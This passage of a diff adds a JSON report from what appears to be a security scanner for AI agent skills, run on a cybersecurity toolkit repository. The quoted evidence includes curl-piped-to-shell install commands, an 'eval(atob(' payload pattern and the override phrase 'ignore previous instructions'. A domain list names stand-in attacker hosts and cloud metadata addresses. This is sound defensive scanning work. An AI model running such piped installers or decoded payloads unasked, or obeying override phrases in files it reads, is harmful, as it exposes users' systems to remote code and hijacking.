+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/scanning-container-images-with-grype/scripts/agent.py",
+      "line": 35,
+      "evidence": "curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh",
+      "file_sha256": "132f4916833405b8b4af675c94c69a3e9542c9b39fbd9e06d71ed02e6c9c71a3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/scanning-container-images-with-grype/references/workflows.md",
+      "line": 8,
+      "evidence": "curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh",
+      "file_sha256": "d946c402c3c17af9750e34f65dd892f03165f808ad8500db9d967ac908b96773"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/detecting-aws-credential-exposure-with-trufflehog/SKILL.md",
+      "line": 92,
+      "evidence": "curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scr",
+      "file_sha256": "aafe742fca6245cdaaf75366e6a1f3a2062ecc70727150661efe324bf952a641"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/analyzing-sbom-for-supply-chain-vulnerabilities/references/api-reference.md",
+      "line": 169,
+      "evidence": "curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh",
+      "file_sha256": "9fcd7cdfb12d249cf191dda95562dc4f4f87a358409a9e23ec5f9b36d51f0d90"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/offensive-windows-mitigations/SKILL.md",
+      "line": 3820,
+      "evidence": "p=0.97 #### CET Instructions",
+      "file_sha256": "92297e537e2fb3feef31d154d9527bc7f2b4be739045ddb101ade52c1ed0c145"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/deobfuscating-javascript-malware/SKILL.md",
+      "line": 111,
+      "evidence": "eval(atob(",
+      "file_sha256": "099c1c671f0f350d883a7c0ffeb5c04673f0c5b709e46264fcd53f2e6ba41948"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/hardening-docker-daemon-configuration/SKILL.md",
+      "line": 252,
+      "evidence": "curl -fsSL https://get.docker.com/rootless | sh",
+      "file_sha256": "d0daafa02e4cf698e94fef901fcca93be2fa84090352ebc695b9450849a21179"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/securing-container-registry-images/SKILL.md",
+      "line": 51,
+      "evidence": "curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh",
+      "file_sha256": "aa3f24a64078600844c3ee120d6665c69dee4c61f9e2af485d518651dcfebe42"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/securing-container-registry-images/scripts/agent.py",
+      "line": 58,
+      "evidence": "curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh",
+      "file_sha256": "b8fc1422d771a63378e22ff2732ab7b0f35a70fab202b8a25a3caea3e128cfed"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/.claude/skills/building-incident-response-playbook/SKILL.md",
+      "line": 154,
+      "evidence": "p=0.97 Write tool-specific instructions for each step (not generic guidance):",
+      "file_sha256": "cf95102d6b57ba6d4ec781ffa350d4861a500f38c86828f678d6cac4a5e38af9"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/sandbox/kata.test.mjs",
+      "line": 440,
+      "evidence": "readFileSync(resolve(import.meta.dirname, '..', '.dockerignore'), 'utf8')",
+      "file_sha256": "ac6120ca4b368ec6271d9e249c82d1ff24790211312721f428e58ac92edf4eed"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/install.sh",
+      "line": 1251,
+      "evidence": "curl|bash",
+      "file_sha256": "8596bcc212edcb3d583332d8a6955aa0851f9b9ec58c58a51d6e6ea77a2e7f85"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/mcp_server/ctf_advisor.py",
+      "line": 605,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "ee14f0408b89df81cc69451f6820fbb0ff6975055f2e3e23f267add87114791b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "cybersec-toolkit-b14699711e6bde37ed1007f1a991f649b4ace17f/mcp_server/bounty_advisor.py",
+      "line": 365,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "7596b3ddfd9e4026b7102ea836ba253207f31802299fba68582795bc249efcfc"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "169.254.169.254",
+    "adamsvoboda.net",
+    "amr-git-dot.github.io",
+    "api.crowdstrike.com",
+    "api.npmjs.org",
+    "api.ransomware.live",
+    "api.target.com",
+    "attack.mitre.org",
+    "attacker-analytics.com",
+    "attacker-controlled-site.com",
+    "attacker.com",
+    "aws-encryption-sdk-python.readthedocs.io",
+    "blog.thinkst.com",
+    "book.hacktricks.xyz",
+    "boto3.amazonaws.com",
+    "breakdev.org",
+    "canary.tools",
+    "canarytokens.com",
+    "canarytokens.org",
+    "cheatsheetseries.owasp.org",
+    "company.okta.com",
+    "csrc.nist.gov",
+    "developer.atlassian.com",
+    "developer.cisco.com",
+    "developer.servicenow.com",
+    "docs.aws.amazon.com",
+    "docs.canary.tools",
+    "docs.canarytokens.org",
+    "docs.python-requests.org",
+    "docs.strangebee.com",
+    "docs.zeek.org",
+    "download.opensuse.org",
+    "evil.com",
+    "falcon.crowdstrike.com",
+    "gist.github.com",
+    "github.com",
+    "grafana.com",
+    "graph.microsoft.com",
+    "hooks.slack.com",
+    "hugovk.github.io",
+    "id-ransomware.malwarehunterteam.com",
+    "internalit.company.com",
+    "ise.example.com",
+    "jamf.company.com",
+    "json.schemastore.org",
+    "landing.google.com",
+    "learn.jamf.com",
+    "learn.microsoft.com",
+    "legit.com",
+    "letsdefend.io",
+    "login.microsoftonline.com",
+    "lolbas-project.github.io",
+    "lots-project.com",
+    "management.azure.com",
+    "metadata.google.internal",
+    "mitre-attack.github.io",
+    "mythicmeta.github.io",
+    "nighthawkc2.io",
+    "nostarch.com",
+    "owasp.org",
+    "plaso.readthedocs.io",
+    "pool.minexmr",
+    "portswigger.net",
+    "pypi.org",
+    "pypistats.org",
+    "raw.githubusercontent.com",
+    "registry.npmjs.org",
+    "schema.org",
+    "schemas.microsoft.com",
+    "search.sigstore.dev",
+    "socradar.io",
+    "support.google.com",
+    "talosintelligence.com",
+    "target.com",
+    "target.example.com",
+    "timesketch.local",
+    "timesketch.org",
+    "token.actions.githubusercontent.com",
+    "trusted.com",
+    "update.malicious",
+    "vectr.io",
+    "wixtoolset.org",
+    "www.aha.org",
+    "www.apache.org",
+    "www.bitsight.com",
+    "www.cisa.gov",
+    "www.cisco.com",
+    "www.ciscolive.com",
+    "www.crowdstrike.com",
+    "www.cyfirma.com",
+    "www.first.org",
+    "www.googleapis.com",
+    "www.huntandhackett.com",
+    "www.ic3.gov",
+    "www.linddun.org",
+    "www.networkcomputing.com",
+    "www.ransomlook.io",
+    "www.sans.org",
+    "www.sophos.com",
+    "zeltser.com"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
